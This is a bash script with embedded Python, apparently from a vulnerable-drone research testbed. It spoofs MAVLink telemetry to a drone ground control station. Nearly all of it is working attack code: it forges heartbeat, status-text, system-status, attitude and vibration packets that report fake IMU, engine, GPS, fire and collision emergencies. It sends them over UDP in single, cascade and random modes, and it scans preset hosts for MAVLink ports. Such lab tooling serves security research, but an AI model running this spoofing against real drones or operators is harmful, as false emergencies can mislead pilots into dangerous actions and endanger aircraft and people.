#!/bin/bash
# critical_error_spoofing_attack.sh - 드론 시스템 치명적 오류 스푸핑 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/critical_error_spoofing.sh
# Purpose: MAVLink 시스템 상태 메시지 조작으로 GCS에게 가짜 치명적 오류 전송

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Critical Error Spoofing Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}       Critical Error Spoofing Attack     ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_critical_error_spoofing() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"14550"}
    local error_type=${3:-"imu_failure"}
    local duration=${4:-30}
    
    log_info "Starting critical error spoofing attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Error type: ${error_type}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_error_spoof "$target_host" "$target_port" "$error_type" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Critical error spoofing attack completed successfully"
        return 0
    else
        log_error "Critical error spoofing attack failed"
        return 1
    fi
}

create_and_run_error_spoof() {
    local target_host="$1"
    local target_port="$2"
    local error_type="$3"
    local duration="$4"
    
    log_info "Creating and executing critical error spoofing attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random
import signal

class CriticalErrorSpoofer:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.duration = int(duration)
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        # 미리 정의된 치명적 오류 시나리오
        self.error_scenarios = {
            "imu_failure": {
                "name": "IMU Complete Failure",
                "severity": mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                "message": "CRITICAL ERROR: IMU FAILURE - STABILIZATION LOST",
                "system_status": mavutil.mavlink.MAV_STATE_CRITICAL,
                "sensors_health": 0x00000000,  # 모든 센서 불량
                "voltage": 0,  # 전력 시스템 실패
                "battery_remaining": 0
            },
            "engine_failure": {
                "name": "Engine/Motor Failure",
                "severity": mavutil.mavlink.MAV_SEVERITY_EMERGENCY,
                "message": "EMERGENCY: ENGINE FAILURE - IMMEDIATE LANDING REQUIRED",
                "system_status": mavutil.mavlink.MAV_STATE_EMERGENCY,
                "sensors_health": 0x0000FF00,  # 모터 시스템 실패
                "voltage": 2800,  # 저전압
                "battery_remaining": 5
            },
            "gps_failure": {
                "name": "GPS Navigation Failure",
                "severity": mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                "message": "CRITICAL: GPS NAVIGATION FAILURE - POSITION UNKNOWN",
                "system_status": mavutil.mavlink.MAV_STATE_CRITICAL,
                "sensors_health": 0xFFFF00FF,  # GPS 센서 실패
                "voltage": 3200,
                "battery_remaining": 15
            },
            "communication_failure": {
                "name": "Communication System Failure",
                "severity": mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                "message": "CRITICAL: COMMUNICATION FAILURE - TELEMETRY LOST",
                "system_status": mavutil.mavlink.MAV_STATE_CRITICAL,
                "sensors_health": 0xFF00FFFF,  # 통신 시스템 실패
                "voltage": 3400,
                "battery_remaining": 20
            },
            "fire_emergency": {
                "name": "Fire/Overheat Emergency",
                "severity": mavutil.mavlink.MAV_SEVERITY_EMERGENCY,
                "message": "EMERGENCY: FIRE DETECTED - IMMEDIATE SHUTDOWN REQUIRED",
                "system_status": mavutil.mavlink.MAV_STATE_EMERGENCY,
                "sensors_health": 0x00FF0000,  # 온도 센서 경고
                "voltage": 3600,  # 과전압
                "battery_remaining": 30
            },
            "collision_alert": {
                "name": "Collision Avoidance Alert",
                "severity": mavutil.mavlink.MAV_SEVERITY_EMERGENCY,
                "message": "EMERGENCY: COLLISION IMMINENT - EVASIVE ACTION REQUIRED",
                "system_status": mavutil.mavlink.MAV_STATE_EMERGENCY,
                "sensors_health": 0xFFFFFF00,  # 충돌 회피 센서 경고
                "voltage": 3300,
                "battery_remaining": 25
            },
            "system_overload": {
                "name": "System Overload Critical",
                "severity": mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                "message": "CRITICAL: SYSTEM OVERLOAD - PERFORMANCE DEGRADED",
                "system_status": mavutil.mavlink.MAV_STATE_CRITICAL,
                "sensors_health": 0x0F0F0F0F,  # 시스템 과부하
                "voltage": 3100,
                "battery_remaining": 10
            }
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. Sent {self.packets_sent} error packets.")
        self.running = False
        sys.exit(0)
    
    def create_heartbeat(self, system_status):
        """치명적 상태를 나타내는 하트비트"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=system_status
        ).pack(mav)
    
    def create_statustext(self, severity, message):
        """치명적 오류 텍스트 메시지"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        # 메시지가 50자를 초과하면 자름
        if len(message) > 50:
            message = message[:47] + "..."
        
        return mav.statustext_encode(
            severity=severity,
            text=message.encode('utf-8')
        ).pack(mav)
    
    def create_sys_status(self, scenario_data):
        """시스템 상태 메시지 (모든 센서 실패 표시)"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.sys_status_encode(
            onboard_control_sensors_present=0xFFFFFFFF,  # 모든 센서 존재
            onboard_control_sensors_enabled=0xFFFFFFFF,   # 모든 센서 활성화
            onboard_control_sensors_health=scenario_data['sensors_health'],  # 센서 상태
            load=1000,  # 100% CPU 부하
            voltage_battery=scenario_data['voltage'],  # 배터리 전압 (mV)
            current_battery=0,  # 전류 소모 (10*mA)
            battery_remaining=scenario_data['battery_remaining'],  # 남은 배터리 (%)
            drop_rate_comm=1000,  # 100% 통신 패킷 손실
            errors_comm=999,      # 통신 오류 개수
            errors_count1=999,    # 센서 오류 1
            errors_count2=999,    # 센서 오류 2
            errors_count3=999,    # 센서 오류 3
            errors_count4=999     # 센서 오류 4
        ).pack(mav)
    
    def create_attitude(self):
        """불안정한 자세 데이터 (시스템 실패 시뮬레이션)"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        # 극도로 불안정한 자세 값
        return mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            roll=random.uniform(-1.5, 1.5),      # 극심한 롤링
            pitch=random.uniform(-1.5, 1.5),     # 극심한 피칭
            yaw=random.uniform(-3.14, 3.14),     # 무작위 방향
            rollspeed=random.uniform(-2.0, 2.0), # 빠른 회전
            pitchspeed=random.uniform(-2.0, 2.0),
            yawspeed=random.uniform(-2.0, 2.0)
        ).pack(mav)
    
    def create_vibration(self):
        """극심한 진동 데이터 (시스템 실패 표시)"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.vibration_encode(
            time_usec=int(time.time() * 1e6),
            vibration_x=random.uniform(50.0, 100.0),  # 극심한 X축 진동
            vibration_y=random.uniform(50.0, 100.0),  # 극심한 Y축 진동
            vibration_z=random.uniform(50.0, 100.0),  # 극심한 Z축 진동
            clipping_0=random.randint(1000, 5000),    # 진동 클리핑
            clipping_1=random.randint(1000, 5000),
            clipping_2=random.randint(1000, 5000)
        ).pack(mav)
    
    def send_mavlink_packet(self, packet_data):
        """UDP를 통한 MAVLink 패킷 전송"""
        try:
            packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=packet_data)
            send(packet, verbose=False)
            self.packets_sent += 1
            return True
        except Exception as e:
            print(f"[!] Packet send failed: {e}")
            return False
    
    def single_error_spoof(self, error_type):
        """단일 오류 타입으로 스푸핑"""
        if error_type not in self.error_scenarios:
            print(f"[-] Unknown error type: {error_type}")
            print(f"[*] Available types: {', '.join(self.error_scenarios.keys())}")
            return False
        
        scenario = self.error_scenarios[error_type]
        print(f"[*] Spoofing critical error: {scenario['name']}")
        print(f"[*] Error message: {scenario['message']}")
        print(f"[*] Severity level: {scenario['severity']}")
        
        packets_this_session = 0
        message_counter = 0
        
        while self.running and (time.time() - self.start_time) < self.duration:
            # 하트비트 (치명적 상태)
            if self.send_mavlink_packet(self.create_heartbeat(scenario['system_status'])):
                packets_this_session += 1
            
            # 오류 텍스트 메시지 (반복적으로 전송)
            if self.send_mavlink_packet(self.create_statustext(scenario['severity'], scenario['message'])):
                packets_this_session += 1
            
            # 시스템 상태 (모든 센서 실패)
            if self.send_mavlink_packet(self.create_sys_status(scenario)):
                packets_this_session += 1
            
            # 불안정한 자세 데이터
            if self.send_mavlink_packet(self.create_attitude()):
                packets_this_session += 1
            
            # 극심한 진동 데이터
            if self.send_mavlink_packet(self.create_vibration()):
                packets_this_session += 1
            
            # 추가 경고 메시지 (다양화)
            if message_counter % 3 == 0:
                additional_messages = [
                    "SYSTEM FAILURE DETECTED",
                    "IMMEDIATE PILOT INTERVENTION REQUIRED", 
                    "AUTO-PILOT DISENGAGED",
                    "MANUAL CONTROL ONLY",
                    "EMERGENCY PROCEDURES ACTIVATED"
                ]
                additional_msg = additional_messages[message_counter % len(additional_messages)]
                if self.send_mavlink_packet(self.create_statustext(mavutil.mavlink.MAV_SEVERITY_ALERT, additional_msg)):
                    packets_this_session += 1
            
            message_counter += 1
            
            # 진행 상황 표시
            if packets_this_session % 30 == 0:
                elapsed = int(time.time() - self.start_time)
                remaining = self.duration - elapsed
                print(f"[*] Error spoofing progress: {elapsed}s/{self.duration}s, "
                      f"packets sent: {self.packets_sent}, remaining: {remaining}s")
            
            time.sleep(1)  # 1초마다 전송
        
        print(f"[+] Critical error spoofing completed. Total packets sent: {self.packets_sent}")
        return True
    
    def cascade_failure_spoof(self):
        """연쇄적 시스템 실패 시뮬레이션"""
        print("[*] Starting cascade failure simulation...")
        
        failure_sequence = ["gps_failure", "imu_failure", "communication_failure", "engine_failure", "fire_emergency"]
        phase_duration = self.duration // len(failure_sequence)
        
        for i, error_type in enumerate(failure_sequence):
            if not self.running:
                break
            
            scenario = self.error_scenarios[error_type]
            print(f"\\n[*] Phase {i+1}: {scenario['name']}")
            
            phase_start = time.time()
            packets_this_phase = 0
            
            while self.running and (time.time() - phase_start) < phase_duration:
                # 각 페이즈별 패킷 전송
                self.send_mavlink_packet(self.create_heartbeat(scenario['system_status']))
                self.send_mavlink_packet(self.create_statustext(scenario['severity'], scenario['message']))
                self.send_mavlink_packet(self.create_sys_status(scenario))
                self.send_mavlink_packet(self.create_attitude())
                self.send_mavlink_packet(self.create_vibration())
                
                packets_this_phase += 5
                
                if packets_this_phase % 25 == 0:
                    phase_elapsed = int(time.time() - phase_start)
                    print(f"    Phase progress: {phase_elapsed}s/{phase_duration}s")
                
                time.sleep(1)
            
            print(f"[+] Phase {i+1} completed: {packets_this_phase} packets sent")
        
        print(f"[+] Cascade failure simulation completed. Total packets: {self.packets_sent}")
        return True
    
    def random_error_spoof(self):
        """무작위 오류 발생 시뮬레이션"""
        print("[*] Starting random error simulation...")
        
        error_types = list(self.error_scenarios.keys())
        
        while self.running and (time.time() - self.start_time) < self.duration:
            # 무작위 오류 선택
            current_error = random.choice(error_types)
            scenario = self.error_scenarios[current_error]
            
            # 10-15초간 해당 오류 전송
            error_duration = random.randint(10, 15)
            error_start = time.time()
            
            print(f"[*] Random error: {scenario['name']} for {error_duration}s")
            
            while self.running and (time.time() - error_start) < error_duration and (time.time() - self.start_time) < self.duration:
                self.send_mavlink_packet(self.create_heartbeat(scenario['system_status']))
                self.send_mavlink_packet(self.create_statustext(scenario['severity'], scenario['message']))
                self.send_mavlink_packet(self.create_sys_status(scenario))
                self.send_mavlink_packet(self.create_attitude())
                
                if self.packets_sent % 40 == 0:
                    elapsed = int(time.time() - self.start_time)
                    print(f"[*] Random errors: {elapsed}s/{self.duration}s, current: {current_error}")
                
                time.sleep(1)
        
        print(f"[+] Random error simulation completed. Total packets: {self.packets_sent}")
        return True

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
error_type = "$error_type"
duration = int("$duration")

spoofer = CriticalErrorSpoofer(target_ip, target_port, duration)

try:
    print(f"[*] Starting critical error spoofing attack on {target_ip}:{target_port}")
    print(f"[*] Error type: {error_type}, Duration: {duration} seconds")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    if error_type == "cascade":
        success = spoofer.cascade_failure_spoof()
    elif error_type == "random":
        success = spoofer.random_error_spoof()
    elif error_type in spoofer.error_scenarios:
        success = spoofer.single_error_spoof(error_type)
    else:
        # 기본값: IMU 실패
        success = spoofer.single_error_spoof("imu_failure")
    
    if success:
        print(f"\\n[+] Critical error spoofing attack completed successfully")
        print(f"[+] Total error packets sent: {spoofer.packets_sent}")
        sys.exit(0)
    else:
        print(f"\\n[-] Critical error spoofing attack failed")
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:14550"
        "127.0.0.1:14551"
        "10.13.0.6:14550"
        "10.13.0.4:14550"
        "192.168.13.14:14550"
        "192.168.1.100:14550"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink scapy >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-14550}"
    local error_type="${3:-imu_failure}"
    local duration="${4:-30}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [error_type] [duration]"
        echo "  target_host : Target IP address (default: 127.0.0.1)"
        echo "  target_port : Target MAVLink port (default: 14550)"
        echo "  error_type  : Type of critical error (default: imu_failure)"
        echo "  duration    : Attack duration in seconds (default: 30)"
        echo ""
        echo "Error types:"
        echo "  imu_failure         : IMU complete failure"
        echo "  engine_failure      : Engine/motor failure emergency"
        echo "  gps_failure         : GPS navigation failure"
        echo "  communication_failure : Communication system failure"
        echo "  fire_emergency      : Fire/overheat emergency"
        echo "  collision_alert     : Collision avoidance alert"
        echo "  system_overload     : System overload critical"
        echo "  cascade            : Cascade failure simulation"
        echo "  random             : Random error simulation"
        echo ""
        echo "Examples:"
        echo "  $0                                    # IMU failure for 30s"
        echo "  $0 10.13.0.6 14550 engine_failure 60  # Engine failure for 60s"
        echo "  $0 127.0.0.1 14550 cascade 120       # Cascade failures for 120s"
        echo "  $0 127.0.0.1 14550 random 90         # Random errors for 90s"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.6:14550    - QGroundControl (Bridge)"
        echo "  192.168.13.14:14550 - MAVProxy (WiFi)"
        echo "  127.0.0.1:14550    - Local SITL"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_critical_error_spoofing "$target_host" "$target_port" "$error_type" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi